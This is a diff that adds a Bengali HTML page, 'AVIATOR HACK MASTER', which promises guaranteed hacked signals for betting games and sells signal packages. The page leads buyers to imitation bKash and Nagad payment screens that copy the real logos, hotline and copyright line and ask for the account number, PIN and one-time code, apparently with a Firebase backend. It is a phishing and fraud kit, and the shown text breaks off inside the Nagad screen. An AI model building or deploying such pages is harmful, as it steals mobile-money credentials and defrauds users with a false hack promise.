@@ -1,0 +1,1742 @@
+
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=ai-legible&utm_source=comment&utm_medium=referral&utm_id=7050f35b-0913-4245-bdba-0170fb95edaa
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="hosting-provider" content="Netlify">
+<meta name="netlify-deploy" content="https://netlify.new/?utm_campaign=ai-legible&amp;utm_source=meta&amp;utm_medium=referral&amp;utm_id=7050f35b-0913-4245-bdba-0170fb95edaa">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AVIATOR HACK MASTER </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Firebase SDKs for Payment Gateway -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #030305;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        .live-header {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            width: 100%;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 20;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .live-badge {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #22c55e;
+            color: #22c55e;
+            padding: 6px 12px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 0 12px rgba(34, 197, 94, 0.4);
+        }
+
+        .online-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #22c55e;
+            border-radius: 50%;
+            animation: pulseDot 1.5s infinite;
+        }
+
+        @keyframes pulseDot {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.4); opacity: 0.4; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .time-badge {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #38bdf8;
+            color: #38bdf8;
+            padding: 6px 12px;
+            border-radius: 20px;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 0 12px rgba(56, 189, 248, 0.4);
+            min-width: 110px;
+            text-align: center;
+        }
+
+        .app-card-wrapper {
+            position: relative;
+            width: 95%;
+            max-width: 440px;
+            border-radius: 42px;
+            padding: 4px;
+            z-index: 10;
+            margin: 55px 0 10px 0;
+            background: linear-gradient(0deg, #ff007f, #7209b7, #00f0ff, #39ff14, #ff007f);
+            background-size: 100% 400%;
+            animation: borderRotate 3s linear infinite;
+            box-shadow: 0 0 45px rgba(255, 0, 127, 0.8), 0 0 25px rgba(0, 240, 255, 0.6);
+        }
+
+        @keyframes borderRotate {
+            0% { background-position: 0% 0%; }
+            50% { background-position: 0% 100%; }
+            100% { background-position: 0% 0%; }
+        }
+
+        .app-card {
+            width: 100%;
+            min-height: 82vh;
+            background: rgba(8, 8, 12, 0.97);
+            border-radius: 40px;
+            padding: 35px 22px 25px 22px;
+            text-align: center;
+            position: relative;
+            backdrop-filter: blur(8px);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            overflow: hidden;
+        }
+
+        .robot-container {
+            position: absolute;
+            top: -42px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 82px;
+            height: 82px;
+            border-radius: 50%;
+            border: 2px solid #00f0ff;
+            box-shadow: 0 0 25px rgba(0, 240, 255, 0.9);
+            background: rgba(11, 11, 16, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: floatRobot 3s ease-in-out infinite;
+            z-index: 25;
+        }
+
+        @keyframes floatRobot {
+            0% { transform: translateX(-50%) translateY(0px) rotate(0deg); }
+            50% { transform: translateX(-50%) translateY(-6px) rotate(2deg); }
+            100% { transform: translateX(-50%) translateY(0px) rotate(0deg); }
+        }
+
+        .close-btn {
+            position: absolute;
+            top: -25px;
+            right: 12px;
+            width: 42px;
+            height: 42px;
+            background: #ef4444;
+            color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 20px;
+            box-shadow: 0 0 18px #ef4444;
+            cursor: pointer;
+            z-index: 30;
+            border: 2px solid #030305;
+        }
+
+        .step { 
+            display: none; 
+            position: relative;
+            flex-grow: 1;
+            z-index: 2;
+        }
+        .step.active { 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .logo-wrapper {
+            position: relative;
+            width: 95px;
+            height: 95px;
+            margin: 25px auto 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .outer-ring {
+            position: absolute;
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            border: 2px dashed #00f0ff;
+            animation: spin 6s linear infinite;
+        }
+
+        .inner-circle {
+            width: 72px;
+            height: 72px;
+            background: #000;
+            border-radius: 50%;
+            border: 2px solid #ff007f;
+            box-shadow: 0 0 16px #ff007f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+            overflow: hidden;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .logo-title {
+            font-size: 30px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            background: linear-gradient(90deg, #00f0ff, #90e0ef, #ff007f, #00f0ff);
+            background-size: 300% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shimmerText 3s linear infinite;
+            text-shadow: 0 0 25px rgba(0, 240, 255, 0.8);
+            margin-bottom: 10px;
+        }
+
+        @keyframes shimmerText {
+            0% { background-position: 0% center; }
+            100% { background-position: 300% center; }
+        }
+
+        input[type="text"], input[type="tel"], input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            border-radius: 30px;
+            border: 2px solid #00f0ff;
+            background: #000;
+            color: #fff;
+            text-align: center;
+            margin-bottom: 12px;
+            outline: none;
+            font-size: 15px;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.3);
+        }
+
+        .btn {
+            width: 100%;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: 0.2s;
+            text-decoration: none;
+            display: inline-block;
+            position: relative;
+            z-index: 5;
+        }
+
+        .btn-wave-action {
+            background: linear-gradient(270deg, #00f0ff, #ff0055, #0077b6, #ff4d4d);
+            background-size: 400% 400%;
+            animation: blueRedWave 4s ease infinite;
+            color: #fff;
+            border: 2px solid rgba(0, 240, 255, 0.8);
+            padding: 16px 20px;
+            font-size: 18px;
+            font-weight: 900;
+        }
+
+        .btn-small-pulse-buy {
+            background: linear-gradient(270deg, #39ff14, #00f0ff, #ff007f);
+            background-size: 300% 300%;
+            animation: blueRedWave 4s ease infinite;
+            color: #fff;
+            border: 3px solid #ffffff;
+            padding: 10px 16px;
+            font-size: 14px;
+            font-weight: 900;
+            max-width: 65%;
+            margin: 0 auto 10px auto;
+            display: block;
+            border-radius: 25px;
+        }
+
+        @keyframes blueRedWave {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .btn-telegram-support {
+            background: #229ED9;
+            color: #fff;
+            border: 2px solid #ffffff;
+            padding: 10px 18px;
+            font-size: 13px;
+            font-weight: bold;
+            border-radius: 25px;
+            max-width: 75%;
+            margin: 0 auto 8px auto;
+            display: block;
+        }
+
+        .btn-green-border { 
+            border: 2px solid #22c55e; 
+            background: rgba(10, 10, 15, 0.92); 
+            color: #22c55e; 
+            padding: 12px 20px;
+            font-size: 14px;
+        }
+
+        .btn-red-border { 
+            border: 2px solid #ef4444; 
+            background: rgba(10, 10, 15, 0.92); 
+            color: #ef4444; 
+            padding: 12px 20px;
+            font-size: 14px;
+        }
+
+        .package-card {
+            background: #050508;
+            border: 2px solid #00f0ff;
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            text-align: left;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 0 12px rgba(0, 240, 255, 0.25);
+        }
+
+        .package-card.selected { 
+            border-color: #ffd700; 
+            transform: scale(1.03); 
+            box-shadow: 0 0 25px rgba(255, 215, 0, 0.8);
+            background: #141208;
+        }
+
+        .discount-badge {
+            position: absolute;
+            right: 15px;
+            top: -10px;
+            background: #ef4444;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 10px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+
+        .price { 
+            color: #eab308; 
+            font-weight: bold; 
+            text-align: right;
+            font-size: 16px;
+        }
+
+        .payment-option-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            transition: 0.2s;
+        }
+
+        .bkash-btn {
+            background-color: #e2136e;
+            color: #ffffff;
+            border: 2px solid #ff3399;
+        }
+
+        .nagad-btn {
+            background-color: #f7941d;
+            color: #ffffff;
+            border: 2px solid #ffd700;
+        }
+
+        .payment-option-btn:active {
+            transform: scale(0.97);
+        }
+
+        .gateway-box {
+            background: #ffffff;
+            color: #333;
+            border-radius: 20px;
+            overflow: hidden;
+            text-align: left;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            margin-top: 5px;
+        }
+
+        .gateway-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            border-bottom: 1px solid #eaeaea;
+            background: #fff;
+        }
+
+        .gateway-header img {
+            height: 38px;
+            object-fit: contain;
+        }
+
+        .user-section {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px 15px;
+            border-bottom: 1px solid #f0f0f0;
+            background: #fff;
+            color: #111;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background-color: #000;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 10px;
+            overflow: hidden;
+        }
+
+        .avatar svg {
+            width: 22px;
+            height: 22px;
+        }
+
+        .user-details .username {
+            font-size: 14px;
+            font-weight: 500;
+            color: #111;
+        }
+
+        .user-details .inv {
+            font-size: 12px;
+            color: #666;
+        }
+
+        .amount-display {
+            font-size: 18px;
+            font-weight: 600;
+            color: #222;
+        }
+
+        .main-gateway-form-box {
+            padding: 25px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .main-gateway-form-box h3 {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+
+        .gw-input-container {
+            width: 100%;
+            background-color: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 12px 15px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+            margin-bottom: 10px;
+        }
+
+        .gw-input-container input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333;
+            background: transparent;
+            text-align: left;
+            letter-spacing: 1px;
+            box-shadow: none !important;
+            margin-bottom: 0 !important;
+        }
+
+        .gw-terms {
+            font-size: 12px;
+        }
+
+        .gw-terms a {
+            text-decoration: underline;
+        }
+
+        .resend-text {
+            margin-top: 8px;
+            font-size: 12px;
+        }
+
+        .resend-text a {
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .resend-text a.disabled {
+            text-decoration: none;
+            cursor: not-allowed;
+            pointer-events: none;
+            opacity: 0.6;
+        }
+
+        .gateway-action-buttons {
+            display: flex;
+            padding: 15px;
+            background-color: #ffffff;
+            gap: 10px;
+            border-top: 1px solid #eaeaea;
+        }
+
+        .gw-btn {
+            flex: 1;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            text-align: center;
+            cursor: pointer;
+            border: 1px solid #ddd;
+            transition: all 0.3s ease;
+            background-color: #f4f4f4;
+            color: #666;
+            pointer-events: none;
+        }
+
+        .gw-btn.active {
+            color: #ffffff;
+            pointer-events: auto;
+            cursor: pointer;
+        }
+
+        .gateway-footer {
+            padding: 10px 15px;
+            text-align: center;
+            background-color: #fafafa;
+            border-top: 1px solid #eee;
+        }
+
+        .hotline-txt {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .hotline-txt svg {
+            width: 14px;
+            height: 14px;
+            margin-right: 5px;
+        }
+
+        .copyright-txt {
+            font-size: 11px;
+            color: #777;
+        }
+
+        /* কাস্টম আকর্ষণীয় লোডিং ও পেমেন্ট ফেইল্ড স্ক্রিন স্টাইল */
+        .loading-screen-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+            min-height: 65vh;
+        }
+
+        .spinner-ring {
+            width: 90px;
+            height: 90px;
+            border: 5px solid rgba(0, 240, 255, 0.2);
+            border-top: 5px solid #00f0ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px auto;
+            box-shadow: 0 0 20px rgba(0, 240, 255, 0.5);
+        }
+
+        .loading-title {
+            font-size: 22px;
+            font-weight: 900;
+            color: #00f0ff;
+            margin-bottom: 12px;
+        }
+
+        .loading-desc {
+            font-size: 14px;
+            color: #cbd5e1;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .countdown-timer-badge {
+            background: rgba(239, 68, 68, 0.15);
+            border: 2px solid #ef4444;
+            color: #ef4444;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
+            margin-bottom: 20px;
+        }
+
+        .failed-box {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .failed-icon {
+            font-size: 60px;
+            color: #ef4444;
+            margin-bottom: 15px;
+            animation: bounceIcon 1s infinite alternate;
+        }
+
+        @keyframes bounceIcon {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-8px); }
+        }
+
+        .whatsapp-contact-btn {
+            background: #25d366;
+            color: #fff;
+            padding: 14px 24px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 0 20px rgba(37, 211, 102, 0.6);
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        /* ড্যাশবোর্ড স্টাইল */
+        .dashboard-box {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            text-align: left;
+        }
+
+        .top-info-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            font-weight: bold;
+            color: #ffea00;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 5px;
+        }
+
+        .search-display-box {
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #00ffcc;
+            border-radius: 15px;
+            padding: 10px;
+            text-align: center;
+            min-height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: inset 0 0 10px rgba(0, 255, 204, 0.3);
+        }
+
+        .typing-signal {
+            font-size: 16px;
+            font-weight: 900;
+            background: linear-gradient(45deg, #00ffcc, #ffea00, #ff007f);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+
+        .whatsapp-box {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #25d366;
+            border-radius: 15px;
+            padding: 6px 12px;
+        }
+
+        .whatsapp-number {
+            color: #25d366;
+            font-weight: 900;
+            font-size: 14px;
+        }
+
+        .wa-btn {
+            background: #25d366;
+            color: #fff;
+            padding: 5px 10px;
+            border-radius: 10px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 150px;
+            height: 150px;
+            margin: 5px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid transparent;
+        }
+
+        .ring-1 {
+            border-top-color: #00ffcc;
+            border-bottom-color: #ff007f;
+            animation: spinClockwise 3s linear infinite;
+        }
+
+        .ring-2 {
+            width: 80%;
+            height: 80%;
+            border-left-color: #ffea00;
+            border-right-color: #00ffcc;
+            animation: spinCounterClockwise 2s linear infinite;
+        }
+
+        @keyframes spinClockwise {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes spinCounterClockwise {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(-360deg); }
+        }
+
+        .center-signal {
+            position: relative;
+            font-size: 30px;
+            font-weight: 900;
+            z-index: 5;
+            background: linear-gradient(135deg, #ff007f, #00ffcc, #ffea00, #ff007f);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: textZigzagAnim 2s ease infinite;
+        }
+
+        @keyframes textZigzagAnim {
+            0% { background-position: 0% 0%; }
+            50% { background-position: 100% 100%; }
+            100% { background-position: 0% 0%; }
+        }
+
+        .telegram-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .tg-icon {
+            width: 32px;
+            height: 32px;
+            background: #0088cc;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 16px;
+            color: #fff;
+            box-shadow: 0 0 10px #0088cc;
+        }
+
+        .site-msg {
+            font-size: 11px;
+            color: #00ffcc;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .zigzag-line {
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, #ff007f, #00ffcc, #ffea00, #ff007f);
+            background-size: 300% 300%;
+            animation: zigzagAnim 3s ease infinite;
+            border-radius: 5px;
+        }
+
+        @keyframes zigzagAnim {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .hidden { display: none !important; }
+    </style>
+
+<style id="falling-zigzag-animation">
+/* Falling neon zigzag particles - visual only */
+.zigzag-particle-layer{position:fixed;inset:0;pointer-events:none;overflow:hidden;z-index:9998;}
+.zigzag-particle{position:absolute;top:-30px;width:7px;height:7px;border-radius:50%;opacity:.9;filter:drop-shadow(0 0 7px currentColor);animation:zigzagFall linear infinite;}
+@keyframes zigzagFall{0%{transform:translate3d(0,-30px,0) rotate(0deg);opacity:0}10%{opacity:1}25%{transform:translate3d(28px,25vh,0) rotate(90deg)}50%{transform:translate3d(-25px,50vh,0) rotate(180deg)}75%{transform:translate3d(30px,75vh,0) rotate(270deg)}100%{transform:translate3d(-10px,110vh,0) rotate(360deg);opacity:0}}
+.zigzag-back{z-index:1;opacity:.55}.zigzag-front{z-index:9998}
+.app-card-wrapper,.app-card{position:relative;}
+.app-card-wrapper{overflow:visible;}
+</style>
+<script>
+(function(){
+ const colors=['#ff007f','#7209b7','#00f0ff','#39ff14','#ffd000','#ff4d4d'];
+ function makeLayer(cls,count){
+  const layer=document.createElement('div'); layer.className='zigzag-particle-layer '+cls;
+  for(let i=0;i<count;i++){const d=document.createElement('span');d.className='zigzag-particle';d.style.left=(Math.random()*100)+'%';d.style.color=colors[i%colors.length];d.style.background='currentColor';d.style.animationDuration=(4+Math.random()*5)+'s';d.style.animationDelay=(-Math.random()*9)+'s';d.style.width=d.style.height=(3+Math.random()*6)+'px';layer.appendChild(d)}
+  document.body.appendChild(layer);
+ }
+ function start(){makeLayer('zigzag-back',35);makeLayer('zigzag-front',28);}
+ if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',start);else start();
+})();
+</script>
+</head>
+<body>
+
+<div class="live-header">
+    <div class="live-badge">
+        <span class="online-dot"></span>
+        <span id="onlineCount">3482</span><span> অনলাইন</span>
+    </div>
+    <div class="time-badge" id="liveClock">00:00:00 PM</div>
+</div>
+
+<div class="app-card-wrapper">
+    <div class="robot-container">
+        <svg viewBox="0 0 100 100" width="55" height="55">
+            <line x1="50" y1="22" x2="50" y2="12" stroke="#00f0ff" stroke-width="3" stroke-linecap="round"/>
+            <circle cx="50" cy="10" r="4" fill="#00f0ff"/>
+            <rect x="25" y="22" width="50" height="36" rx="10" fill="#1e293b" stroke="#00f0ff" stroke-width="2.5"/>
+            <circle cx="40" cy="36" r="6" fill="#00f0ff"/><circle cx="60" cy="36" r="6" fill="#00f0ff"/>
+            <rect x="32" y="60" width="36" height="28" rx="6" fill="#1e293b" stroke="#00f0ff" stroke-width="2.5"/>
+        </svg>
+    </div>
+
+    <div class="app-card">
+        <!-- Step 1: Login Page -->
+        <div id="step1" class="step active">
+            <div>
+                <div class="logo-wrapper">
+                    <div class="outer-ring"></div>
+                    <div class="inner-circle"><span style="color: #00f0ff; font-size: 24px; font-weight: 900;">MR</span></div>
+                </div>
+                <div class="logo-title"> 
+                আমাদের হ্যাক ফাইলটি যে কোন ব্যাটিং সাইটে কাজ করবে ১০০% গ্যারান্টি 
+                
+               আপনি চাইলে আগে সিগনাল চেক করে দেখতে পারেন 
+                AVIATOR HACK MASTER </div>
+                <input type="text" id="accessCode" placeholder="Enter Key">
+                <div id="loginMsg" style="font-size: 13px; font-weight: bold; margin-bottom: 8px; min-height: 18px;"></div>
+            </div>
+            <div>
+                <button type="button" class="btn btn-wave-action" onclick="checkLogin()">LOGIN</button>
+                <button type="button" class="btn btn-small-pulse-buy" onclick="goToStep(2)">BUY NOW</button>
+                <a href="" target="_blank" class="btn btn-telegram-support">Telegram Support</a>
+            </div>
+        </div>
+
+        <!-- Step 2: Buy Now - Game Select -->
+        <div id="step2" class="step">
+            <div class="close-btn" onclick="goToStep(1)">✕</div>
+            <div>
+                <div style="background:#000; border:2px solid #22c55e; border-radius:14px; padding:12px; margin-bottom:15px;">
+                    <div style="color:#22c55e; font-size:13px; font-weight:bold;">প্যাকেজ কেনার আগে MASTER VAI এর সাথে যোগাযোগ করুন।</div>
+                </div>
+            </div>
+            <div>
+                <button type="button" class="btn btn-green-border" style="width:100%; margin-bottom:12px;" onclick="selectGame('CRASH')">CRASH HACK SIGNAL</button>
+                <button type="button" class="btn btn-red-border" style="width:100%;" onclick="selectGame('AVIATOR')">AVIATOR HACK SIGNAL</button>
+            </div>
+        </div>
+
+        <!-- Step 3: Site Name -->
+        <div id="step3" class="step">
+            <div class="close-btn" onclick="goToStep(2)">✕</div>
+            <div>
+                <h3 id="gameTitle" style="margin-bottom:15px; color: #00f0ff;">আপনি যেই বেটিং সাইটের সিগন্যাল দেখতে চান সেই সাইটের নাম লিখুন অথবা লিংক কপি করে পেস্ট করে দেন  </h3>
+                <input type="text" id="siteNameInput" placeholder="বেটিং সাইটের নাম লিখুন ">
+            </div>
+            <div>
+                <button type="button" class="btn btn-green-border" style="width:100%;" onclick="submitSiteName()">পরবর্তী ধাপে এগিয়ে যান </button>
+            </div>
+        </div>
+
+        <!-- Step 4: Package Select -->
+        <div id="step4" class="step">
+            <div class="close-btn" onclick="goToStep(3)">✕</div>
+            <div>
+                <h3 style="color: #22c55e; margin-bottom: 15px;">জিতার পরে অবশ্যই মাস্টার ভাইকে রিভিউ দিবেন প্লিজ 🙏🙏🙏                  প্যাকেজ নির্বাচন করুন</h3>
+                
+                <div class="package-card selected" onclick="selectPkg(20, '১০ টি সিগন্যাল চেক পাবেন', this)">
+                    
+                    <div>১০ টি সিগন্যাল চেক পাবেন</b></div>
+                    <div class="price">20 BDT</div>
+                </div>
+
+                <div class="package-card" onclick="selectPkg(1850, '1 ঘন্টার জন্য সিগন্যাল পাবেন', this)">
+                   
+                    <div><b>1 ঘন্টার জন্য সিগন্যাল পাবেন</b></div>
+                    <div class="price">1850 BDT</div>
+                </div>
+            </div>
+            <div>
+                <button type="button" class="btn btn-green-border" style="width:100%;" onclick="goToStep(5)">পরবর্তী ধাপ এগিয়ে যান </button>
+            </div>
+        </div>
+
+        <!-- Step 5: Payment Gateway Selection -->
+        <div id="step5" class="step">
+            <div class="close-btn" onclick="goToStep(4)">✕</div>
+            <div>
+                <h3 style="color: #fff; margin-bottom: 20px;">টাকা পাঠানোর  ক্ষেত্রে অবশ্যই আপনার নগদ পেমেন্ট ব্যবহার করতে হবে </h3>
+
+                <button type="button" class="payment-option-btn nagad-btn" onclick="initGateway('Nagad')">
+                    নগদ পেমেন্ট মেথড 
+                </button>
+            </div>
+            <div></div>
+        </div>
+
+        <!-- Step 5.1: bKash Gateway Multi-Step UI -->
+        <div id="stepBkashContainer" class="step">
+            <div class="close-btn" onclick="goToStep(5)">✕</div>
+            <div class="gateway-box">
+                <div class="gateway-header">
+                    <img src="https://www.logo.wine/a/logo/BKash/BKash-Logo.wine.svg" alt="bKash Logo">
+                </div>
+                <div class="user-section">
+                    <div class="user-info">
+                        <div class="avatar">
+                            <svg viewBox="0 0 24 24" style="fill: #007bff;"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        </div>
+                        <div class="user-details">
+                            <div class="username">Payment_Ma Telecom</div>
+                            <div class="inv" id="bKashInv">Inv No:6a8d2299</div>
+                        </div>
+                    </div>
+                    <div class="amount-display" id="displayAmountBkash">৳19.00</div>
+                </div>
+
+                <!-- bKash Sub-step 1: Number -->
+                <div id="bkashSubNum">
+                    <div class="main-gateway-form-box" style="background-color: #e2136e; color: #fff;">
+                        <h3>Your bKash Account Number</h3>
+                        <div class="gw-input-container">
+                            <input type="tel" id="bkashNumberInput" placeholder="01XXXXXXXXX" maxlength="11">
+                        </div>
+                        <div class="gw-terms">Confirm and proceed, <a href="#" style="color:#fff;">terms & conditions</a></div>
+                    </div>
+                    <div class="gateway-action-buttons">
+                        <div class="gw-btn" style="background:#fff; color:#333; pointer-events:auto;" onclick="goToStep(5)">Cancel</div>
+                        <div id="bkashConfirmBtn" class="gw-btn" style="background-color: #e4e4e4; color: #999;">Confirm</div>
+                    </div>
+                </div>
+
+                <!-- bKash Sub-step 2: PIN -->
+                <div id="bkashSubPin" class="hidden">
+                    <div class="main-gateway-form-box" style="background-color: #e2136e; color: #fff;">
+                        <h3>Your bKash PIN</h3>
+                        <div class="gw-input-container">
+                            <input type="password" id="bkashPinInput" placeholder="Enter bKash PIN" maxlength="5">
+                        </div>
+                        <div class="gw-terms"><a href="#" style="color:#fff;">Forgot PIN?</a></div>
+                    </div>
+                    <div class="gateway-action-buttons">
+                        <div class="gw-btn" style="background:#fff; color:#333; pointer-events:auto;" onclick="switchBkashSub('num')">Back</div>
+                        <div id="bkashPinConfirmBtn" class="gw-btn" style="background-color: #e4e4e4; color: #999;">Confirm</div>
+                    </div>
+                </div>
+
+                <!-- bKash Sub-step 3: OTP -->
+                <div id="bkashSubOtp" class="hidden">
+                    <div class="main-gateway-form-box" style="background-color: #e2136e; color: #fff;">
+                        <h3>Enter Verification Code (OTP)</h3>
+                        <div class="gw-input-container">
+                            <input type="tel" id="bkashOtpInput" placeholder="Enter 6-digit OTP" maxlength="6">
+                        </div>
+                        <div class="resend-text" style="color: #fff;">
+                            Didn't get code? <a id="bkashResendBtn" class="disabled" style="color:#ffd1e8;">Resend (<span id="bkashTimer">30</span>s)</a>
+                        </div>
+                    </div>
+                    <div class="gateway-action-buttons">
+                        <div class="gw-btn" style="background:#fff; color:#333; pointer-events:auto;" onclick="switchBkashSub('pin')">Back</div>
+                        <div id="bkashOtpConfirmBtn" class="gw-btn" style="background-color: #e4e4e4; color: #999;">Verify</div>
+                    </div>
+                </div>
+
+                <div class="gateway-footer">
+                    <div class="hotline-txt" style="color: #e2136e;">
+                        <svg viewBox="0 0 24 24" style="fill: #e2136e;"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                        16247
+                    </div>
+                    <div class="copyright-txt">© 2026 bKash, All Rights Reserved</div>
+                </div>
+            </div>
+            <div></div>
+        </div>
+
+        <!-- Step 5.2: Nagad Gateway Multi-Step UI -->
+        <div id="stepNagadContainer" class="step">
+            <div class="close-btn" onclick="goToStep(5)">✕</div>
+            <div class="gateway-box">
+                <div class="gateway-header">
+                    <img src="https://i.ibb.co.com/VW3F5QL2/images.png" alt="Nagad Logo" style="height: 48px;">
+                </div>
+                <div class="user-section">
+                    <div class="user-info">
+                        <div class="avatar">
+                            <svg viewBox="0 0 24 24" style="fill: #E31B23;"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                        </div>
+                        <div class="user-details">
+                            <div class="username">Nagad Payment    Ma Telecom</div>
